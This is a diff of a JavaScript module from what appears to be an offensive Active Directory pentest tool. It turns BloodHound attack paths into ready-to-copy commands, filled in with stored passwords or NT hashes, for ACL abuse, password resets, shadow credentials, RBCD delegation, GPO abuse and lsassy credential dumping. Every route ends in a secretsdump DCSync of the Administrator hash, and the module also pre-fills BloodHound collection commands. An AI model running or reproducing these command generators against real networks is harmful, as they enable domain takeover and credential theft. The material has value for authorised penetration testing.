@@ -1,42 +1,37 @@
 /*!
  * obol ui - routes/domain.js - BloodHound domain analysis, 100% client-side.
  * Upload a SharpHound zip (or BloodHound-CE JSONs) -> OBOL.bloodhound parses + derives the
- * high-value census + owned→DA attack paths + a self-contained printable report. Analysis runs
- * in a Web Worker when available (big zips stay off the main thread), else on the main thread.
+ * high-value census + owned->DA attack paths + a self-contained printable report.
  */
 (function (root) {
   'use strict';
-  var OBOL = root.OBOL = root.OBOL || {};
+  var OBOL = root.OBOL || (root.OBOL = {});
   var U = OBOL.util;
   function esc(s) { return U.esc(s); }
 
-  // The principal currently shown in the inspect slot. Module-scoped so it survives a re-render
-  // (ticking "I Own This" re-renders the tab; we restore the card afterwards).
   var _inspecting = null;
   var _lastEngId = null;
 
-  // What-If sandbox: a hypothetical-owned set layered on top of the real owned set, EPHEMERAL (module
-  // scope, never written to the engagement) so you can ask "what if I also had these?" and see the whole
-  // picture (route, graph, hunt, reach) recompute, then Commit the ones you really took, or Clear. Keyed
-  // by UPPER short name -> the full principal name. Distinct from real ownership (the three doors), which
-  // persists in eng.bloodhound.ownedExtra.
+  // What-If sandbox: hypothetical-owned set layered on top of the real owned set, EPHEMERAL
   var _whatIf = {};
   function whatIfList() { return Object.keys(_whatIf).map(function (k) { return _whatIf[k]; }); }
-  function isWhatIf(principal) { return !!_whatIf[shortName(principal).toUpperCase()]; }
-  // The owned set that DRIVES every derivation on the tab: the real owned accounts plus the what-if ones.
+  function isWhatIf(principal) {
+    var rawUp = String(principal == null ? '' : principal).toUpperCase();
+    var shUp = shortName(principal).toUpperCase();
+    return !!(_whatIf[rawUp] || _whatIf[shUp]);
+  }
   function effectiveOwned() {
     var all = ownedFromEngagement().concat(whatIfList());
     var seen = {}, out = [];
-    all.forEach(function (o) { var k = shortName(o).toUpperCase(); if (k && !seen[k]) { seen[k] = 1; out.push(o); } });
+    all.forEach(function (o) {
+      var k = String(o == null ? '' : o).toUpperCase();
+      if (k && !seen[k]) { seen[k] = 1; out.push(o); }
+    });
     return out;
   }
 
-  // The accounts you own, from three doors into one set: a stored credential, the engagement's
-  // username param, and the principals you manually asserted ("I own this now") on the Domain tab
-  // (eng.bloodhound.ownedExtra). A pasted login/crack mints a credential, so that door feeds the
-  // same set; re-uploading BloodHound keeps ownedExtra, so that door does too.
   function ownedFromEngagement() {
-    var eng = OBOL.store.active();
+    var eng = OBOL.store.active() || {};
     var owned = [];
     (eng.credentials || []).forEach(function (c) { if (c.user) owned.push(String(c.user).toUpperCase()); });
     if (eng.params && eng.params.username) owned.push(String(eng.params.username).toUpperCase());
@@ -46,23 +41,26 @@
       if (u) owned.push(String(u).toUpperCase());
     });
     var extra = (eng.bloodhound && eng.bloodhound.ownedExtra) || [];
-    extra.forEach(function (x) { if (x) owned.push(String(x).split('@')[0].toUpperCase()); });
+    extra.forEach(function (x) {
+      if (!x) return;
+      var s = String(x).trim();
+      owned.push(s.indexOf('@') >= 0 ? s.toUpperCase() : s.split('@')[0].toUpperCase());
+    });
     return owned.filter(function (v, i, a) { return v && a.indexOf(v) === i; });
   }
 
-  // Is this principal in the owned set (any of the three doors)?
   function isOwnedPrincipal(principal, owned) {
+    var rawUp = String(principal == null ? '' : principal).toUpperCase();
     var short = shortName(principal).toUpperCase();
-    return (owned || []).some(function (o) { return shortName(o).toUpperCase() === short; });
+    return (owned || []).some(function (o) {
+      var oUp = String(o == null ? '' : o).toUpperCase();
+      if (oUp.indexOf('@') >= 0 && rawUp.indexOf('@') >= 0) return oUp === rawUp;
+      return shortName(o).toUpperCase() === short;
+    });
   }
 
-  // A per-tool command context for ONE principal: fills the DC/host/lhost and, if that account's
-  // secret is in the credential store, its -H hash or -p password so the walk commands are complete.
   function cmdCtxFor(principal) { return cmdCtx([principal], true); }
 
-  // Fill the query-card commands from what this engagement already knows: the DC/target host, the
-  // operator's listener IP, and (on-screen only) the owned account's secret. includeSecret is false
-  // for the exportable report so hashes/passwords never land in a shareable document.
   function cmdCtx(owned, includeSecret) {
     var eng = OBOL.store.active() || {}, params = eng.params || {};
     var dc = null;
@@ -76,11 +74,12 @@
         var creds = [];
         try { creds = (OBOL.creds && OBOL.creds.gather) ? OBOL.creds.gather(eng, facts) : (eng.credentials || []); }
         catch (e) { creds = eng.credentials || []; }
-        var c = creds.filter(function (x) { return x && x.user && String(x.user).toLowerCase() === firstUser; })[0];
+        var c = creds.filter(function (x) { return x && x.user && String(x.user).split('@')[0].toLowerCase() === firstUser; })[0];
+        if (!c && params.username && String(params.username).split('@')[0].toLowerCase() === firstUser) {
+          c = { user: params.username, password: params.password, nthash: params.nthash };
+        }
         if (c) {
           var h = c.nthash || c.hash, pw = c.password || c.plaintext || c.secret;
-          // carry the RAW secret parts too, so per-tool auth syntax (evil-winrm -H, xfreerdp /pth,
-          // impacket -hashes) is built correctly for a hash-only identity - not a blank -p ''.
           if (h && /^[a-fA-F0-9]{32}$/.test(String(h))) { ctxOut.secret = '-H ' + h; ctxOut.nt = h; }
           else if (pw) { ctxOut.secret = "-p '" + String(pw).replace(/'/g, "'\\''") + "'"; ctxOut.pw = pw; }
         }
@@ -91,8 +90,6 @@
 
   function shortName(s) { return String(s == null ? '' : s).split('@')[0]; }
 
-  // The coach's top queued move + how many it ranks right now, so the Domain tab can say "this data
-  // became your next moves, here they are in Next Steps". General: any ingest re-ranks the coach.
   function coachQueued() {
     try {
       var ranked = OBOL.pack.rankActions(OBOL.store.factSet(), OBOL.packs.actions(), {});
@@ -100,30 +97,133 @@
     } catch (e) { return { top: null, count: 0 }; }
   }
 
-  // A bloodyAD one-liner for walking one hop of the owned->DA path. General per (edge, target kind):
-  // control of the DOMAIN -> grant yourself DCSync; a group -> add yourself as a member; a user ->
-  // reset or shadow it. bloodyAD is obol's house ACL-abuse tool, so the whole chain reads consistently.
   function bdPrefix(ctx, domain, you) {
     var auth = ctx.pw ? ("-p '" + String(ctx.pw).replace(/'/g, "'\\''") + "'") : (ctx.nt ? ("-p ':" + ctx.nt + "'") : "-p '<password>'");
     return "bloodyAD -u '" + (you || '<you>') + "' " + auth + " -d " + (domain || '<domain>') + " --host " + (ctx.dc || '<dc-ip>');
   }
+
   function hopCommand(hop, ctx, domain, you) {
-    var pre = bdPrefix(ctx, domain, you), tgt = shortName(hop.to), edge = String(hop.edge || ''), kind = String(hop.to_kind || '').toLowerCase();
-    if (/memberof|getchanges|dcsync/i.test(edge)) return '';   // membership / replication right is cashed in by secretsdump
-    if (/domain/.test(kind) && /genericall|writedacl|owns|writeowner|allextendedrights/i.test(edge)) return pre + " add dcsync '" + (you || '<you>') + "'";
-    if (/group/.test(kind) || /addmember|addself/i.test(edge)) return pre + " add groupMember '" + tgt + "' '" + (you || '<you>') + "'";
-    if (/forcechangepassword/i.test(edge)) return pre + " set password '" + tgt + "' 'Newp@ss123'";
-    if (/addkeycredentiallink/i.test(edge)) {
-      var cAuth = ctx.pw ? ("-p '" + String(ctx.pw).replace(/'/g, "'\\''") + "'") : (ctx.nt ? ("-hashes :" + ctx.nt) : "-p '<password>'");
-      return "certipy shadow auto -u '" + (you || '<you>') + '@' + (domain || '<domain>') + "' " + cAuth + " -dc-ip " + (ctx.dc || '<dc-ip>') + " -account '" + tgt + "'";
+    ctx = ctx || {};
+    var pre = bdPrefix(ctx, domain, you);
+    var tgt = shortName(hop.to);
+    var fullTo = String(hop.to || tgt);
+    var edge = String(hop.edge || '');
+    var kind = String(hop.to_kind || '').toLowerCase();
+    var cAuth = ctx.pw ? ("-p '" + String(ctx.pw).replace(/'/g, "'\\''") + "'") : (ctx.nt ? ('-hashes :' + ctx.nt) : "-p '<password>'");
+    var nxcAuth = ctx.secret || (ctx.pw ? ("-p '" + String(ctx.pw).replace(/'/g, "'\\''") + "'") : (ctx.nt ? ('-H ' + ctx.nt) : "-p '<password>'"));
+    var impAuth = ctx.pw
+      ? ("'" + (domain || '<domain>') + '/' + (you || '<you>') + ':' + String(ctx.pw).replace(/'/g, "'\\''") + "'")
+      : (ctx.nt ? ("-hashes :" + ctx.nt + " '" + (domain || '<domain>') + '/' + (you || '<you>') + "'") : ("'" + (domain || '<domain>') + '/' + (you || '<you>') + ":<password>'"));
+
+    if (/^(memberof|getchanges|getchangesall|dcsync)$/i.test(edge)) return '';
+    if (/domain/.test(kind) && /genericall|writedacl|owns|writeowner|allextendedrights/i.test(edge)) {
+      return pre + " add dcsync '" + (you || '<you>') + "'";
     }
-    if (/genericall|genericwrite|writedacl|owns|writeowner|allextendedrights/i.test(edge)) return pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "'";
-    return pre + "  # abuse " + edge + " on " + tgt;
+    if (/group/.test(kind) || /addmember|addself/i.test(edge)) {
+      if (/writeowner/i.test(edge)) {
+        return pre + " set owner '" + tgt + "' '" + (you || '<you>') + "' && " + pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "' && " + pre + " add groupMember '" + tgt + "' '" + (you || '<you>') + "'";
+      }
+      if (/writedacl|owns/i.test(edge)) {
+        return pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "' && " + pre + " add groupMember '" + tgt + "' '" + (you || '<you>') + "'";
+      }
+      return pre + " add groupMember '" + tgt + "' '" + (you || '<you>') + "'";
+    }
+    if (/forcechangepassword/i.test(edge)) {
+      return pre + " set password '" + tgt + "' 'Newp@ss123!'";
+    }
+    if (/addkeycredentiallink/i.test(edge)) {
+      return "certipy shadow auto -u '" + (you || '<you>') + '@' + (domain || '<domain>') + "' " + cAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>') + " -account '" + tgt + "'";
+    }
+    if (/writespn/i.test(edge)) {
+      return pre + " set object '" + tgt + "' servicePrincipalName -v 'http/anything' && impacket-GetUserSPNs " + impAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>') + " -request-user '" + tgt + "'";
+    }
+    if (/readgmsapassword/i.test(edge)) {
+      return 'nxc ldap ' + (ctx.dc || '<dc-ip>') + " -u '" + (you || '<you>') + "' " + nxcAuth + ' --gmsa';
+    }
+    if (/readlapspassword|synclapspassword/i.test(edge)) {
+      return 'nxc ldap ' + (ctx.dc || '<dc-ip>') + " -u '" + (you || '<you>') + "' " + nxcAuth + ' -M laps';
+    }
+    if (/addallowedtoact/i.test(edge)) {
+      return 'impacket-rbcd -delegate-from \'<CONTROLLED_COMP>$\' -delegate-to \'' + tgt.replace(/\$$/, '') + '$\' -action write ' + impAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>')
+        + " && impacket-getST -spn 'cifs/" + fullTo + "' -impersonate Administrator '" + (domain || '<domain>') + "/<CONTROLLED_COMP>$:<COMP_PASS>' -dc-ip " + (ctx.dc || '<dc-ip>');
+    }
+    if (/allowedtoact|allowedtodelegate/i.test(edge)) {
+      return "impacket-getST -spn 'cifs/" + fullTo + "' -impersonate Administrator " + impAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>');
+    }
+    if (/gpoabuse|gplink/i.test(edge) || /gpo/.test(kind)) {
+      return 'python3 pygpoabuse.py ' + impAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>') + " -gpo-id '<GPO_GUID>' -f";
+    }
+    if (/hassidhistory/i.test(edge)) {
+      return 'impacket-secretsdump ' + impAuth + '@' + (ctx.dc || '<dc-ip>') + '   # authenticate carrying sidHistory privilege of ' + tgt;
+    }
+    if (/adminto/i.test(edge)) {
+      return 'nxc smb ' + fullTo + " -u '" + (you || '<you>') + "' " + nxcAuth + ' -M lsassy';
+    }
+    if (/canpsremote/i.test(edge)) {
+      return 'evil-winrm -i ' + fullTo + " -u '" + (you || '<you>') + "' " + nxcAuth;
+    }
+    if (/canrdp/i.test(edge)) {
+      return "xfreerdp /u:'" + (you || '<you>') + "' /v:" + fullTo + ' /cert:ignore';
+    }
+    if (/executedcom/i.test(edge)) {
+      return 'impacket-dcomexec -object MMC20 ' + impAuth + '@' + fullTo;
+    }
+    if (/sqladmin/i.test(edge)) {
+      return 'impacket-mssqlclient ' + impAuth + '@' + fullTo + ' -windows-auth';
+    }
+    if (/hassession/i.test(edge)) {
+      return 'nxc smb ' + shortName(hop.from) + " -u '" + (you || '<you>') + "' " + nxcAuth + ' -M lsassy   # harvest active session of ' + tgt;
+    }
+    if (/writeowner/i.test(edge)) {
+      return pre + " set owner '" + tgt + "' '" + (you || '<you>') + "' && " + pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "'";
+    }
+    if (/writedacl|owns/i.test(edge)) {
+      return pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "'";
+    }
+    if (/genericwrite/i.test(edge) && /user|computer/.test(kind)) {
+      return "certipy shadow auto -u '" + (you || '<you>') + '@' + (domain || '<domain>') + "' " + cAuth + ' -dc-ip ' + (ctx.dc || '<dc-ip>') + " -account '" + tgt + "'";
+    }
+    if (/genericall|genericwrite|allextendedrights/i.test(edge)) {
+      return pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "'";
+    }
+    return pre + '  # abuse ' + edge + ' on ' + tgt;
   }
 
-  // The "route to Domain Admin" block: the derived shortest owned->DA path as NUMBERED steps, each with
-  // the exact bloodyAD command for its edge, ending in the DCSync cash-in, plus a bridge to Next Steps.
-  // Reuses view.analysis (already computed) so it is general to any collection, not this box.
+  // Walk a multi-hop chain and update the active identity/credential context when a hop compromises
+  // a new principal (e.g. ForceChangePassword, AddKeyCredentialLink, ReadGMSAPassword, HasSession).
+  function pathCommandChain(hops, baseCtx, domain, startYou) {
+    var curYou = startYou || '<you>';
+    var curCtx = Object.assign({}, baseCtx || {});
+    var steps = [];
+    (hops || []).forEach(function (h) {
+      var cmd = hopCommand(h, curCtx, domain, curYou);
+      var edge = String(h.edge || '');
+      var kind = String(h.to_kind || '').toLowerCase();
+      var nextTarget = shortName(h.to);
+      if (cmd) {
+        steps.push({ hop: h, cmd: cmd, actor: curYou, target: nextTarget, edge: edge });
+      }
+      // Identity handoff for subsequent hops when this hop takes over a user/service account
+      if (/forcechangepassword/i.test(edge)) {
+        curYou = nextTarget;
+        curCtx = Object.assign({}, curCtx, { pw: 'Newp@ss123!', nt: null, secret: "-p 'Newp@ss123!'" });
+      } else if (/addkeycredentiallink/i.test(edge) || (/genericwrite/i.test(edge) && /user/.test(kind))) {
+        curYou = nextTarget;
+        curCtx = Object.assign({}, curCtx, { pw: null, nt: '<SHADOW_NTHASH>', secret: '-H <SHADOW_NTHASH>' });
+      } else if (/readgmsapassword/i.test(edge)) {
+        curYou = nextTarget;
+        curCtx = Object.assign({}, curCtx, { pw: null, nt: '<GMSA_NTHASH>', secret: '-H <GMSA_NTHASH>' });
+      } else if (/hassession/i.test(edge)) {
+        curYou = nextTarget;
+        curCtx = Object.assign({}, curCtx, { pw: null, nt: '<SESSION_NTHASH>', secret: '-H <SESSION_NTHASH>' });
+      } else if (/genericall|writedacl|writeowner|owns|allextendedrights/i.test(edge) && /user/.test(kind)) {
+        curYou = nextTarget;
+        curCtx = Object.assign({}, curCtx, { pw: 'Newp@ss123!', nt: null, secret: "-p 'Newp@ss123!'" });
+      }
+    });
+    return { steps: steps, finalYou: curYou, finalCtx: curCtx };
+  }
+
   function routeStepsHtml(view, owned, summary, ctx, pathIdx) {
     var an = (view && view.analysis) || {};
     if (!an.headline) return '';
@@ -143,7 +243,7 @@
           return (p.hops || []).some(function (h) { return !/memberof/i.test(h.edge); });
         })[0] || an.paths[0];
       }
-      var hops = (selPath && selPath.hops) || [], step = 0;
+      var hops = (selPath && selPath.hops) || [];
       var you = (hops[0] && hops[0].from) ? shortName(hops[0].from) : (shortName((owned && owned[0]) || '') || '<you>');
       var pCtx = (hops[0] && hops[0].from) ? cmdCtxFor(you) : (ctx || cmdCtx(owned, true));
       var chain = '<div class="bh-route-chain"><span class="bh-rn owned">' + esc(you) + '</span>';
@@ -152,18 +252,17 @@
         chain += '<span class="bh-re">' + esc(h.edge) + '</span><span class="bh-rn' + (isGoal ? ' goal' : '') + '">' + esc(shortName(h.to)) + '</span>';
       });
       out += chain + '</div><ol class="bh-steps">';
-      hops.forEach(function (h) {
-        var cmd = hopCommand(h, pCtx, domain, you);
-        if (!cmd) return;   // skip pure MemberOf hops (no action)
-        step++;
-        out += '<li><div class="bh-step-what">' + esc(h.edge) + ' on <b>' + esc(shortName(h.to)) + '</b></div>'
-          + '<div class="bh-cmd"><code>' + esc(cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(cmd) + '">Copy</button></div></li>';
+      var walked = pathCommandChain(hops, pCtx, domain, you);
+      walked.steps.forEach(function (st) {
+        var actorNote = st.actor !== you ? (' <span class="bh-x-kind">(as ' + esc(st.actor) + ')</span>') : '';
+        out += '<li><div class="bh-step-what">' + esc(st.edge) + ' on <b>' + esc(st.target) + '</b>' + actorNote + '</div>'
+          + '<div class="bh-cmd"><code>' + esc(st.cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(st.cmd) + '">Copy</button></div></li>';
       });
-      // the cash-in: once you hold DCSync, dump the Administrator hash via DRSUAPI (no ADMIN$ required)
       var dumpDom = domain || '<domain>';
-      var dump = pCtx.nt
-        ? "impacket-secretsdump -hashes :" + pCtx.nt + " '" + dumpDom + "/" + you + "'@" + (pCtx.dc || '<dc-ip>') + " -just-dc"
-        : "impacket-secretsdump '" + dumpDom + "/" + you + ":" + (pCtx.pw ? String(pCtx.pw).replace(/'/g, "'\\''") : '<password>') + "'@" + (pCtx.dc || '<dc-ip>') + " -just-dc";
+      var fCtx = walked.finalCtx, fYou = walked.finalYou;
+      var dump = fCtx.nt
+        ? 'impacket-secretsdump -hashes :' + fCtx.nt + " '" + dumpDom + '/' + fYou + "'@" + (fCtx.dc || '<dc-ip>') + ' -just-dc'
+        : "impacket-secretsdump '" + dumpDom + '/' + fYou + ':' + (fCtx.pw ? String(fCtx.pw).replace(/'/g, "'\\''") : '<password>') + "'@" + (fCtx.dc || '<dc-ip>') + ' -just-dc';
       out += '<li><div class="bh-step-what">DCSync: dump the Administrator hash</div>'
         + '<div class="bh-cmd"><code>' + esc(dump) + '</code><button class="btn-copy" data-copy="' + U.attr(dump) + '">Copy</button></div></li></ol>';
     }
@@ -171,8 +270,6 @@
     return out;
   }
 
-  // A bounded list that reveals the rest behind a "+ N more" button (no data hidden for good, the
-  // user can open everything). itemsHtml is an array of <li> strings; the toggle is wired in mounted().
   function expandableList(itemsHtml, limit, noun) {
     limit = limit || 8;
     var n = itemsHtml.length;
@@ -184,9 +281,6 @@
       + '<button class="bh-more-btn" type="button">+ ' + extra + ' more ' + esc(noun || 'item') + (extra === 1 ? '' : 's') + '</button>';
   }
 
-  // The runnable commands that only make sense once you OWN this principal: walk its shortest path to
-  // Domain Admin, one bloodyAD command per abusable hop, ending in the DCSync cash-in. Gated: only
-  // rendered for an owned account (the gate below hides it until one of the three ownership doors opens).
   function ownedRouteCommands(principal, paths, summary, ctx) {
     if (!paths || !paths.paths || !paths.paths.length) {
       return '<div class="bh-acq"><div class="bh-acq-h">You Own ' + esc(shortName(principal)) + '</div>'
@@ -195,30 +289,27 @@
     var you = shortName(principal), domain = (summary && summary.domain) || '';
     var hops = paths.paths[0];
     var out = '<div class="bh-acq"><div class="bh-acq-h">Walk This Path (you own ' + esc(you) + ')</div><ol class="bh-steps">';
-    hops.forEach(function (h) {
-      var cmd = hopCommand(h, ctx, domain, you);
-      if (!cmd) return;
-      out += '<li><div class="bh-step-what">' + esc(h.edge) + ' on <b>' + esc(shortName(h.to)) + '</b></div>'
-        + '<div class="bh-cmd"><code>' + esc(cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(cmd) + '">Copy</button></div></li>';
+    var walked = pathCommandChain(hops, ctx, domain, you);
+    walked.steps.forEach(function (st) {
+      var actorNote = st.actor !== you ? (' <span class="bh-x-kind">(as ' + esc(st.actor) + ')</span>') : '';
+      out += '<li><div class="bh-step-what">' + esc(st.edge) + ' on <b>' + esc(st.target) + '</b>' + actorNote + '</div>'
+        + '<div class="bh-cmd"><code>' + esc(st.cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(st.cmd) + '">Copy</button></div></li>';
     });
     var dumpDom = domain || '<domain>';
-    var dump = ctx.nt
-      ? "impacket-secretsdump -hashes :" + ctx.nt + " '" + dumpDom + "/" + you + "'@" + (ctx.dc || '<dc-ip>') + " -just-dc"
-      : "impacket-secretsdump '" + dumpDom + "/" + you + ":" + (ctx.pw ? String(ctx.pw).replace(/'/g, "'\\''") : '<password>') + "'@" + (ctx.dc || '<dc-ip>') + " -just-dc";
+    var fCtx = walked.finalCtx, fYou = walked.finalYou;
+    var dump = fCtx.nt
+      ? 'impacket-secretsdump -hashes :' + fCtx.nt + " '" + dumpDom + '/' + fYou + "'@" + (fCtx.dc || '<dc-ip>') + ' -just-dc'
+      : "impacket-secretsdump '" + dumpDom + '/' + fYou + ':' + (fCtx.pw ? String(fCtx.pw).replace(/'/g, "'\\''") : '<password>') + "'@" + (fCtx.dc || '<dc-ip>') + ' -just-dc';
     out += '<li><div class="bh-step-what">DCSync: dump the Administrator hash</div>'
       + '<div class="bh-cmd"><code>' + esc(dump) + '</code><button class="btn-copy" data-copy="' + U.attr(dump) + '">Copy</button></div></li></ol></div>';
     return out;
   }
 
-  // Inspect ANY principal: its tags (what the data says about it), its shortest path(s) to Domain
-  // Admin, what it controls (forward reachability, expandable), and then EITHER the runnable walk
-  // commands (if you own it) OR the data-indicated way to acquire it plus the ownership gate (if you
-  // do not). Lets a user theorize and target from any account, not only the creds they hold.
   function inspectHtml(principal, summary, owned, ctx) {
     if (!principal || !summary) return '';
     var isReal = isOwnedPrincipal(principal, ownedFromEngagement());
     var isWI = !isReal && isWhatIf(principal);
-    var isOwned = isReal || isWI; // either counts for showing the walk; the tag/gate tell them apart
+    var isOwned = isReal || isWI;
     var prof = OBOL.bloodhound.principalProfile(summary, principal);
     var paths = OBOL.bloodhound.ownedPaths(summary, [principal]) || { paths: [] };
     var ctl = OBOL.bloodhound.controls(summary, principal) || { controls: [], groups: [], count: 0 };
@@ -233,7 +324,8 @@
     if (prof.asrep_roastable) tags.push('<span class="bh-tag warn">AS-REP</span>');
     if (prof.password_not_required) tags.push('<span class="bh-tag free">Blank Password</span>');
 
-    var out = '<div class="bh-explore-card"><h3>' + esc(shortName(principal))
+    var displayTitle = (summary.domains && summary.domains.length > 1 && prof.name && prof.name.indexOf('@') >= 0) ? prof.name : shortName(principal);
+    var out = '<div class="bh-explore-card"><h3>' + esc(displayTitle)
       + ' <span class="bh-x-kind">' + esc(prof.type || 'principal') + '</span></h3>'
       + (tags.length ? '<div class="bh-x-tags">' + tags.join('') + '</div>' : '');
 
@@ -265,12 +357,13 @@
     var hasPaths = !!(paths.paths && paths.paths.length);
     if (isWI) {
       out += '<p class="bh-x-line bh-whatif-note">What-If: ' + (hasPaths ? 'the commands below assume you own this account. ' : 'this account has 0 outbound paths to Domain Admin (shown on the graph as a dead-end node). ')
-        + '<button class="bh-whatif-x" data-whatif-remove="' + U.attr(shortName(principal)) + '">Remove From What-If</button></p>';
+        + '<button class="bh-whatif-x" data-whatif-remove="' + U.attr(principal) + '">Remove From What-If</button></p>';
       out += ownedRouteCommands(principal, paths, summary, ctx);
     } else if (isReal) {
       out += ownedRouteCommands(principal, paths, summary, ctx);
     } else {
-      var acqCtx = Object.assign({}, ctx, { you: (owned && owned[0]) ? shortName(owned[0]) : null });
+      var ownedCtx = (ctx && (ctx.pw || ctx.nt)) ? ctx : cmdCtx(owned, true);
+      var acqCtx = Object.assign({}, ownedCtx, { you: (owned && owned[0]) ? shortName(owned[0]) : null });
       var acq = OBOL.bloodhound.acquisitionLines(summary, principal, acqCtx);
       if (acq.length) {
         out += '<div class="bh-acq"><div class="bh-acq-h">How To Get This Account</div>'
@@ -280,29 +373,25 @@
             }).join('') + '</div>';
       }
       var gateNote = hasPaths
-        ? 'The commands for walking this account\'s path stay hidden until you own it. Tick the box when you really do (or paste proof on Next Steps, or re-upload BloodHound). "Try As What-If" layers it on hypothetically, without touching the engagement, so you can see how the picture would change.'
+        ? 'The commands for walking this account\'s path stay hidden until you own it. Tick the box when you really do (or paste proof in Cockpit, or re-upload BloodHound). "Try As What-If" layers it on hypothetically, without touching the engagement, so you can see how the picture would change.'
         : 'This account has 0 outbound paths to Domain Admin in this collection, so owning it adds no new privilege escalation routes (it is shown on the left of the graph as a dead-end node).';
-      out += '<div class="bh-gate"><label class="bh-gate-own"><input type="checkbox" class="bh-own-check" data-own="' + U.attr(shortName(principal)) + '"> I Own This Account Now</label>'
-        + ' <button class="bh-whatif-x" data-whatif-add="' + U.attr(shortName(principal)) + '">Try As What-If</button>'
+      out += '<div class="bh-gate"><label class="bh-gate-own"><input type="checkbox" class="bh-own-check" data-own="' + U.attr(principal) + '"> I Own This Account Now</label>'
+        + ' <button class="bh-whatif-x" data-whatif-add="' + U.attr(principal) + '">Try As What-If</button>'
         + '<p class="bh-gate-note">' + gateNote + '</p></div>';
     }
     return out + '</div>';
   }
 
-  // Human label for a census-flag diff key.
   function labelFlag(key) {
     return ({
       dcsync_principals: 'Able To DCSync',
       kerberoastable: 'Kerberoastable',
       asrep_roastable: 'AS-REP Roastable',
       password_not_required: 'Blank-Password (PASSWD_NOTREQD)',
-      unconstrained_delegation: 'Unconstrained Delegation',
+      unconstrained_delegation: 'Unconstrained Delegation'
     })[key] || key;
   }
 
-  // "What Changed Since Last Collection": the temporal diff from OBOL.bloodhound.diffCollections.
-  // New edges are the leverage that opened (re-collect after a foothold and this shows what you earned);
-  // flag deltas say who became or stopped being roastable / a DCSync principal. Empty when nothing changed.
   function diffHtml(diff) {
     if (!diff || (!diff.changed && !diff.route)) return '';
     function edgeLi(e) {
@@ -349,9 +438,6 @@
     return out + '</div>';
   }
 
-  // "Best Accounts To Hunt Next": the marginal-value targeting board. The accounts you can go get right
-  // now (their own flags say how), ranked by how close owning them puts you to Domain Admin, each with
-  // its one-line acquisition command. The standout "exceed BloodHound" view: not paths, but who to hunt.
   function huntHtml(summary, owned, ctx) {
     var hunt = OBOL.bloodhound.bestNextTargets(summary, owned, { limit: 50 });
     if (!hunt.targets.length) return '';
@@ -385,6 +471,296 @@
     return out;
   }
 
+  // Live AD Reconnaissance summary from facts already proven in the engagement (useful even before BloodHound upload)
+  function liveAdFactsHtml() {
+    try {
+      var eng = OBOL.store.active() || {};
+      var params = eng.params || {};
+      var facts = OBOL.store.factSet();
+      if (!facts || !facts.values) return '';
+      function dedupCI(list) {
+        var seen = {}, out = [];
+        (list || []).forEach(function (item) {
+          var s = String(item || '').trim();
+          if (!s) return;
+          var k = s.toUpperCase();
+          if (!seen[k]) { seen[k] = 1; out.push(s); }
+        });
+        return out;
+      }
+      var rawDoms = (facts.values('ad.domain_known') || []).map(function (v) { return v && v.name; }).filter(Boolean);
+      if (!rawDoms.length && params.domain) rawDoms.push(params.domain);
+      var doms = dedupCI(rawDoms);
+      var dcs = dedupCI((facts.values('ad.dc_candidate') || []).map(function (v) { return v && v.host; }).filter(Boolean));
+      var uLists = facts.values('ad.user_list') || [];
+      var uCount = uLists.reduce(function (acc, v) { return acc + ((v && v.users && v.users.length) || (v && v.count) || 0); }, 0);
+      var aclLeads = facts.values('ad.acl_lead') || [];
+      var rawAcl = [];
+      aclLeads.forEach(function (v) { ((v && v.targets) || []).forEach(function (t) { if (t) rawAcl.push(t); }); });
+      var aclTargets = dedupCI(rawAcl);
+      var owned = dedupCI(ownedFromEngagement());
+      if (!doms.length && !dcs.length && !uCount && !aclTargets.length && !owned.length) return '';
+
+      var chips = [];
+      if (doms.length) chips.push('<span class="bh-tag own">Domain: ' + esc(doms.join(', ')) + '</span>');
+      if (dcs.length) chips.push('<span class="bh-tag">DC: ' + esc(dcs[0]) + '</span>');
+      if (owned.length) chips.push('<span class="bh-tag own">Owned creds: ' + esc(owned.join(', ')) + '</span>');
+      if (uCount) chips.push('<span class="bh-tag">' + uCount + ' LDAP users enumerated</span>');
+      if (aclTargets.length) chips.push('<span class="bh-tag crit">Writable ACL leads: ' + esc(aclTargets.slice(0, 4).join(', ')) + '</span>');
+      return '<div class="bh-route" id="bh-live-ad"><div class="bh-acq-h">Live AD Reconnaissance (from Cockpit)</div>'
+        + '<div class="bh-x-tags">' + chips.join(' ') + '</div></div>';
+    } catch (e) {
+      return '';
+    }
+  }
+
+  // Beginner-friendly BloodHound collection commands pre-filled from engagement parameters
+  function collectionGuideHtml(hasSummary) {
+    var eng = OBOL.store.active() || {};
+    var params = eng.params || {};
+    var owned = ownedFromEngagement();
+    var ctx = cmdCtx(owned, true);
+    var dom = (eng.bloodhound && eng.bloodhound.domain) || params.domain || '<domain.local>';
+    var dc = ctx.dc || params.target || '<dc-ip>';
+    var user = (owned && owned[0]) ? shortName(owned[0]) : (params.username || '<user>');
+    var pw = ctx.pw || params.password || '<password>';
+    var authFlag = ctx.nt ? ('--hashes :' + ctx.nt) : ("-p '" + String(pw).replace(/'/g, "'\\''") + "'");
+    var nxcAuth = ctx.nt ? ('-H ' + ctx.nt) : ("-p '" + String(pw).replace(/'/g, "'\\''") + "'");
+
+    var cmds = [
+      {
+        label: '1. From Kali (bloodhound-python - collects JSONs + ZIP directly over LDAP/SMB)',
+        cmd: "bloodhound-python -d '" + dom + "' -u '" + user + "' " + authFlag + ' -ns ' + dc + ' -c All --zip'
+      },
+      {
+        label: '2. From Kali (NetExec built-in BloodHound collector)',
+        cmd: 'nxc ldap ' + dc + " -d '" + dom + "' -u '" + user + "' " + nxcAuth + ' --bloodhound -c All --dns-server ' + dc
+      },
+      {
+        label: '3. From a Windows foothold (SharpHound.exe)',
+        cmd: '.\\SharpHound.exe -c All -d ' + dom + ' --zipfilename bh-collection.zip'
+      },
+      {
+        label: '4. Fast ACL fallback without BloodHound (bloodyAD writable object check)',
